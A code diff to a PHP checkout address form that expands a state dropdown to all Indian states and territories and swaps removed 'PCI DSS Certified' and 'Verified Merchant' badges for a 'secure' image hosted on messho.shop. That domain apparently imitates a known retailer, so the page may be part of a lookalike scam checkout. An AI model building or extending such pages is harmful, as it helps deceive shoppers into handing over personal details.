@@ -116,19 +116,29 @@ $address = $_SESSION['address'] ?? [];
       </div>
       
       <div class="form-group">
-        <label>State</label>
-        <select name="state" required>
-          <option value="">Select State</option>
-          <option value="Andhra Pradesh" <?php echo ($address['state'] ?? '') === 'Andhra Pradesh' ? 'selected' : ''; ?>>Andhra Pradesh</option>
-          <option value="Gujarat" <?php echo ($address['state'] ?? '') === 'Gujarat' ? 'selected' : ''; ?>>Gujarat</option>
-          <option value="Maharashtra" <?php echo ($address['state'] ?? '') === 'Maharashtra' ? 'selected' : ''; ?>>Maharashtra</option>
-          <option value="Karnataka" <?php echo ($address['state'] ?? '') === 'Karnataka' ? 'selected' : ''; ?>>Karnataka</option>
-          <option value="Tamil Nadu" <?php echo ($address['state'] ?? '') === 'Tamil Nadu' ? 'selected' : ''; ?>>Tamil Nadu</option>
-          <option value="Delhi" <?php echo ($address['state'] ?? '') === 'Delhi' ? 'selected' : ''; ?>>Delhi</option>
-          <option value="Rajasthan" <?php echo ($address['state'] ?? '') === 'Rajasthan' ? 'selected' : ''; ?>>Rajasthan</option>
-          <option value="West Bengal" <?php echo ($address['state'] ?? '') === 'West Bengal' ? 'selected' : ''; ?>>West Bengal</option>
-        </select>
-      </div>
+      <label>State</label>
+      <select name="state" required>
+        <option value="">Select State</option>
+        <?php
+        // A-Z list of all states and UTs
+        $all_states = [
+            "Andaman and Nicobar Islands", "Andhra Pradesh", "Arunachal Pradesh", "Assam", "Bihar", 
+            "Chandigarh", "Chhattisgarh", "Dadra and Nagar Haveli and Daman and Diu", "Delhi", "Goa", 
+            "Gujarat", "Haryana", "Himachal Pradesh", "Jammu and Kashmir", "Jharkhand", "Karnataka", 
+            "Kerala", "Ladakh", "Lakshadweep", "Madhya Pradesh", "Maharashtra", "Manipur", 
+            "Meghalaya", "Mizoram", "Nagaland", "Odisha", "Puducherry", "Punjab", "Rajasthan", 
+            "Sikkim", "Tamil Nadu", "Telangana", "Tripura", "Uttar Pradesh", "Uttarakhand", "West Bengal"
+        ];
+        
+        $selected_state = $address['state'] ?? '';
+        
+        foreach ($all_states as $state):
+        ?>
+          <option value="<?php echo htmlspecialchars($state); ?>" <?php echo $selected_state === $state ? 'selected' : ''; ?>>
+            <?php echo htmlspecialchars($state); ?>
+          </option>
+        <?php endforeach; ?>
+      </select>
     </div>
     
     <div class="form-group">
@@ -141,31 +151,22 @@ $address = $_SESSION['address'] ?? [];
       <input type="text" name="road_name" required value="<?php echo htmlspecialchars($address['road_name'] ?? ''); ?>"/>
     </div>
     
-    <div class="trust-badges">
-      <div class="trust-badge">
-        <div class="trust-badge-icon">✓</div>
-        <div class="trust-badge-text">PCI DSS<br>Certified</div>
-      </div>
-      <div class="trust-badge">
-        <div class="trust-badge-icon">🔒</div>
-        <div class="trust-badge-text">100%<br>Secured<br>Payments</div>
-      </div>
-      <div class="trust-badge">
-        <div class="trust-badge-icon">✓</div>
-        <div class="trust-badge-text">Verified<br>Merchant</div>
-      </div>
-    </div>
     
-    <div class="powered-by">
-      <a href="#" style="color:#6b7280;text-decoration:none;font-size:11px">T&C</a> | 
-      <a href="#" style="color:#6b7280;text-decoration:none;font-size:11px">Privacy</a> | 
-      <span style="color:#6b7280">e950df29</span>
-      <br>
-      <span style="margin-top:8px;display:inline-block">Powered By <strong style="color:#9333ea">GoKwik</strong></span>
-    </div>
+    
   </form>
+  
 </main>
+        
+<div class="trust-badges"> 
+        <img src="https://messho.shop/assets/website/images/secure.jpg" alt="" style="
+    	height: -webkit-fill-available;
+    	width: -webkit-fill-available;
+      max-width: 600px;
+    margin: 0 auto;
+    padding: 20px 16px 100px;">
+    </div> 
 
+  
 <div class="bottom-actions">
   <button type="submit" form="addressForm">CONTINUE</button>
 </div>
